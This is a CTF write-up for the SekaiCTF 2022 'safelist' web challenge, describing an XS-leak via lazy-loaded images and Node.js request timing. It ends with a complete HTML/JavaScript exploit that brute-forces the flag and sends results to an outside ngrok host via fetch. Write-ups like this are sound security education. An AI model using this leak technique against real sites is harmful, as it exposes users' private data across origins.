---
title: SekaiCTF 2022 - safelist writeup
date: 2022-10-05 20:43:37
tags: [Security]
categories: [Security]
---
<img src="/img/sekaictf2022-safelist-xsleak/cover-en.png" style="display:none">

I got first blood for a challenge called "safelist" in SekaiCTF 2022, it's a challenge about xsleaks and request timing in particular, here is my writeup.

Challenge description: 

> Safelist™ is a completely safe list site to hold all your important notes! I mean, look at all the security features we have, we must be safe!

<!-- more -->

![challenge](/img/sekaictf2022-safelist-xsleak/p1.png)

Source code: https://github.com/project-sekai-ctf/sekaictf-2022/tree/main/web/safelist

The website is simple, you can either create or delete a note, also there is an admin bot to visit the URL you provided.

What's unique about this challenge is that it sets a lot of security headers:

``` js
app.use((req, res, next) => {
    res.locals.nonce = crypto.randomBytes(32).toString("hex");

    // Surely this will be enough to protect my website
    // Clueless
    res.setHeader("Content-Security-Policy", `
        default-src 'self';
        script-src 'nonce-${res.locals.nonce}' 'unsafe-inline';
        object-src 'none';
        base-uri 'none';
        frame-ancestors 'none';
    `.trim().replace(/\s+/g, " "));
    res.setHeader("Cache-Control", "no-store");
    res.setHeader("X-Frame-Options", "DENY");
    res.setHeader("X-Content-Type-Options", "nosniff");
    res.setHeader("Referrer-Policy", "no-referrer");
    res.setHeader("Cross-Origin-Embedder-Policy", "require-corp");
    res.setHeader("Cross-Origin-Opener-Policy", "same-origin");
    res.setHeader("Cross-Origin-Resource-Policy", "same-origin");
    res.setHeader("Document-Policy", "force-load-at-top");

    if (!req.session.id) {
        req.session.id = crypto.randomUUID();
    }
    if (!users.has(req.session.id)) {
        users.set(req.session.id, {
            list: []
        });
    }

    req.user = users.get(req.session.id);
    next();
});
```

Also, the note content is sanitized by `DOMPurify.sanitize()` before assigning it to innerHTML, so there is no way to do XSS.

There is another special feature which caught my eye:

``` js
app.post("/create", (req, res) => {
    let { text } = req.body;

    if (!text || typeof text !== "string") {
        return res.end("Missing 'text' variable")
    }

    req.user.list.push(text.slice(0, 2048));
    req.user.list.sort();

    res.redirect("/");
});
```

When you create a note, the whole list will re-order. The flag format is `^SEKAI{[a-z]+}$`. Knowing this, we can create a note before or after the flag.

It's pretty helpful for performing xsleak.

For example, if we create a note like this(`[CHAR]` can be anything between A to Z): `[CHAR]<canvas height="1200px"></canvas><div id="scroll"></div>`, then we update the location to `#scroll`, if `[CHAR]` is before the flag, no scroll occurs.

A scroll occurs if `[CHAR]` is after the flag. If we can detect this behavior, we can leak the flag char by char.

But the problem is there is a `Cross-Origin-Opener-Policy` header. By setting this header, we can't access the opened window:

``` js
var w = window.open('https://safelist.ctf.sekai.team/')
setTimeout(() => {
    w.location = 'https://safelist.ctf.sekai.team/#scroll' // not working
    // even w.close() not working
}, 200)
```

Basically, we lost all the controls on the opened window, we can just open it but can't close or update its location.

Then, I came up with another way to do the leak.

## Loading image

Lazy loading image is a common technique for xsleaks, my idea is similar to the above, but just replace the scroll fragment with a lazy-loading image tag.

We need to find a threshold to achieve something like this.

The image is loaded when the note I created is before the flag.

![note1](/img/sekaictf2022-safelist-xsleak/p2.png)

When the note is after the flag, image is not load because of `loading=lazy` attribute.

![note2](/img/sekaictf2022-safelist-xsleak/p3.png)

The note content is something like this: `A<br><canvas height="1850px"></canvas><br><img loading=lazy src=/?img>`

`1850px` is a well-crafted number, you can find this threshold by testing it locally, and it's worth mentioning that the threshold is different for normal  and headless browsers. You need to test it on the headless browser to find the correct number(3350px in this case).

What can we do next?

If the image is cached, we can detect it by timing the request, but unfortunately, there is a `Cache-Control: no-store` header, so there is no cache at all.

How about using the concurrent limit to detect? In Chrome, you can only send 6 concurrent requests for each host. The rest will be pending hence takes more time to complete.

So, we can send another request from our page, if images are loaded, our request should take more time.

This should work according to the [solution](https://twitter.com/terjanq/status/1576605101514313735) from @terjanq, but at that time I used `fetch` for timing the request, and somehow the concurrent limit was not applied(maybe the partition key is different).

You can watch these two videos for details:

1. https://www.youtube.com/watch?v=ixyMZlIcnDI (Use script element to send request)
2. https://www.youtube.com/watch?v=15CJQ9nzrxs (Use fetch to send request)

But it's okay. We can still leverage other things.

## Make server side busy?

The server is running on Node.js, and we know that Node.js is single-threaded. What does this mean? This means it can only process one request at the same time.

So, if you have time-consuming work, it may cause performance issues. When the server does some heavy job, the main thread is blocked, so the server can not process all other requests.

Even if no endpoint does heave calculation in the challenge, we can still block the main thread for a bit when we send many requests.

To sum up, the idea is like this:

1. We create a note that starts with a CHAR(a-z)
2. We keep using fetch to measure the response time
3. If response time is less than the threshold, it means the CHAR is after the flag, so images are not load
4. Otherwise, CHAR is before the flag
5. The goal is to find a CHAR that `time(CHAR)>threshold && time(CHAR+1)<threshold`

Below is the screenshot for trying two different chars.

For the note that starts with `SEKAI{z`, the load time is 0.9s (for 30 requests), which means the images are not loaded.

![req1](/img/sekaictf2022-safelist-xsleak/p4.png)

For `SEKAI{m`, the load time is 1.7s which is much more than `z`, which means the correct char is between m to y.

![req2](/img/sekaictf2022-safelist-xsleak/p5.png)

By the way, we can use binary search to speed up the searching part.

Exploit:

https://gist.github.com/aszx87410/155f8110e667bae3d10a36862870ba45

``` html
<!DOCTYPE html>
<html>
<!--
  The basic idea is to create a post with a lot of images which send request to "/" to block server-side nodejs main thread.
  If images are loading, the request to "/" is slower, otherwise faster.
  By using a well-crafted height, we can let note with "A" load image but note with "Z" not load.
  We can use fetch to measure the request time.
-->
<body>
  <button onclick="run()">start</button>
  <form id=f action="http://localhost:1234/create" method="POST" target="_blank">
    <input id=inp name="text" value="">
  </form>

  <form id=f2 action="http://localhost:1234/remove" method="POST" target="_blank">
    <input id=inp2 name="index" value="">
  </form>
  <script>
    let flag = 'SEKAI{'
    const TARGET = 'https://safelist.ctf.sekai.team'
    f.action = TARGET + '/create'
    f2.action = TARGET + '/remove'

    const sleep = ms => new Promise(r => setTimeout(r, ms))
    const send = data => fetch('http://server.ngrok.io?d='+data)
    const charset = 'abcdefghijklmnopqrstuvwxyz'.split('')

    // start exploit
    let count = 0
    setTimeout(async () => {
      let L = 0
      let R = charset.length - 1
      while( (R-L)>3 ) {
        let M = Math.floor((L + R) / 2)
        let c = charset[M]
        send('try_' + flag + c)
        const found = await testChar(flag + c)
        if (found) {
          L = M
        } else {
          R = M - 1
        }
      }

      // fallback to linear since I am not familiar with binary search lol
      for(let i=R; i>=L; i--) {
        let c = charset[i]
        send('try_' + flag + c)
        const found = await testChar(flag + c)
        if (found) {
          send('found: '+ flag+c)
          flag += c
          break
        }
      }
      
    }, 0)

    async function testChar(str) {
      return new Promise(resolve => {
          /*
            For 3350, you need to test it on your local to get this number.
            The basic idea is, if your post starts with "Z", the image should not be loaded because it's under lazy loading threshold
            If starts with "A", the image should be loaded because it's in the threshold.
          */
          inp.value = str + '<br><canvas height="3350px"></canvas><br>'+Array.from({length:20}).map((_,i)=>`<img loading=lazy src=/?${i}>`).join('')
          f.submit()

          setTimeout(() => {
            run(str, resolve)
          }, 500)
      })
    }

    async function run(str, resolve) {
    // if the request is not enough, we can send more by opening more window
      for(let i=1; i<=5;i++) {
        window.open(TARGET)
      }
      
      let t = 0
      const round = 30
      setTimeout(async () => {
        for(let i=0; i<round; i++) {
          let s = performance.now()
          await fetch(TARGET + '/?test', {
            mode: 'no-cors'
          }).catch(err=>1)
          let end = performance.now()
          t += end - s
          console.log(end - s)
        }
        const avg = t/round
        send(str + "," + t + "," + "avg:" + avg)

        /*
          I get this threshold(1000ms) by trying multiple times on remote admin bot
          for example, A takes 1500ms, Z takes 700ms, so I choose 1000 ms as a threshold
        */
        const isFound = (t >= 1000)
        if (isFound) {
          inp2.value = "0"
        } else {
          inp2.value = "1"
        }

        // remember to delete the post to not break our leak oracle
        f2.submit()
        setTimeout(() => {
          resolve(isFound)
        }, 200)
      }, 200)
    }
    
  </script>

</body>

</html>
```
